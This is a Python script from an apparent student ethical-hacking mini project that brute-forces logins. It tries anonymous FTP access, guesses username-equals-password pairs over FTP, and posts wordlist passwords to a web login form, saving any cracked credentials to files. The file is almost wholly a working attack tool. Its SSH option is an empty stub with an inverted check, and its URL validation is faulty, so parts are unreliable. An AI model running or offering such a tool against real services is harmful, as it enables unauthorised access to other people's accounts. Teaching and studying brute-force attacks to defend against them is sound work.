'''
ETHICAL HACKING AND CYBER LAWS MINI PROJECT (2021-2022)

PROJECT TOPIC: BRUTE FORCING LOGIN SERVICES

GROUP MEMBERS:
JOEL ELDOE
OMKAR JAGTAP
VISHAL SARODE
SAHIL KOHINKAR
'''

import ftplib           # Module to implement FTP login
import requests         # Module to send HTTP requests
import os, sys, time    # Modules which support other small functionalities in the project

# ANSI codes for font colors
class colors:
    GREEN = '\033[92m'  # GREEN COLOR
    YELLOW = '\033[93m' # YELLOW COLOR
    RED = '\033[91m'    # RED COLOR
    RESET = '\033[0m'   # RESET COLOR

# Function to implement brute-force attack on the FTP server
def ftpBruteForce(IP, wordlist):
    # List to store the correct credentials
    credentials = []
    
    # Check anonymous login
    try:
        ftp = ftplib.FTP(IP)
        ftp.login('anonymous','')
        print(f"[{colors.GREEN}+{colors.RESET}] Anonymous login found on {IP}!\n")
        credentials.append("anonymous:''")
        ftp.quit()
    except Exception as e:
        if('service not known' in e):
            print(f"[{colors.RED}-{colors.RESET}] This host probably seems to be down or doesn't exist!")
            exit()
        else:
            print(f"[{colors.RED}-{colors.RESET}] Anonymous login not allowed on {IP}!\n")

    # Starting brute-force attack
    f = open(wordlist, 'r')
    for word in f.readlines():
        word = word.strip('\n')
        try:
            ftp = ftplib.FTP(IP, timeout=1)
            ftp.login(word,word)
            print(f"\n[{colors.GREEN}+{colors.RESET}] Login successful using {word}:{word}\n")
            credentials.append(word+":"+word)
            ftp.quit()
        except Exception as e:
            print(f"[{colors.RED}-{colors.RESET}] Login failed using {word}:{word}")
    f.close()

    # Checking whether we got some credentials or not
    if(len(credentials) != 0):
        print(f"\n[{colors.GREEN}+{colors.RESET}] {len(credentials)} user accounts cracked!")
        filename = f"{IP}-FTP-cracked.txt"
        os.system(f'touch {filename}')
        f = open(filename, 'w')
        for creds in credentials:
            f.write(creds+"\n")
        f.close()
    else:
        print(f"\n[{colors.RED}-{colors.RESET}] No credentials found in this list!")

# Function to implement brute-force attack on the web server
def httpBruteForce(url, username, wordlist):
    f = open(wordlist, 'r')
    for word in f.readlines():
        word = word.strip('\n')

        # Data which will be sent with the HTTP request
        data = {
            "username":username,
            "password":word,
            "Login":"Login"
        }

        # Sending an HTTP POST request
        r = requests.post(url, data=data)

        # Checking the HTTP response
        if 'Welcome' in r.text:
            print(f"\n[{colors.GREEN}+{colors.RESET}] Login successful using {username}:{word}\n")

            # Saving the cracked credentials in a file
            filename = f"{url}-HTTP-cracked.txt"
            os.system(f'touch {filename}')
            f = open(filename, 'w')
            f.write(f"{username}:{word}")
            f.close()
            break
        else:
            print(f"[{colors.RED}-{colors.RESET}] Login failed using {username}:{word}")

def main():
    usage = f"{colors.YELLOW}Usage: python3 brutal.py <wordlist> <ftp or ssh or http>{colors.RESET}"

    # Checking the existence of the wordlist file
    try:
        wordlist = sys.argv[1]
        try:
            f = open(wordlist, 'r')
            f.close()
        except OSError as e:
            print(f"[{colors.RED}-{colors.RESET}] {e}")
            print(usage)
            exit()
            
        # Determining the target service
        services = ['ftp','ssh','http']
        service = sys.argv[2]
        if service in services:
            if(service == 'ftp'):
                target = input("Enter the target IP address: ")
                checker = target.split('.')
                if(len(checker) == 4):
                    print(f"Target locked: {colors.YELLOW}{target}{colors.RESET}\n")
                    print("Initiating attack...\n")
                    time.sleep(3)
                    ftpBruteForce(target, wordlist)
                else:
                    print(f"[{colors.RED}-{colors.RESET}] Invalid IP address!")

            elif(service == 'ssh'):
                target = input("Enter the target IP address: ")
                checker = target.split('.')
                if(checker != 4):
                    pass
                else:
                    print(f"[{colors.RED}-{colors.RESET}] Invalid IP address!")

            elif(service == 'http'):
                url = input("Enter the target URL: ")
                if(('http://' or 'https://') in url):
                    username = input("Enter the username: ")
                    print(f"Target locked: {colors.YELLOW}{url}{colors.RESET}\n")
                    print("Initiating attack...\n")
                    time.sleep(3)
                    httpBruteForce(url, username, wordlist)
                else:
                    print(f"[{colors.RED}-{colors.RESET}] Invalid URL!")
        
        else:
            print(f"[{colors.RED}-{colors.RESET}] Attack only possible on ftp, ssh and http services")
            print(usage)
    
    except Exception as e:
        print(usage)

main()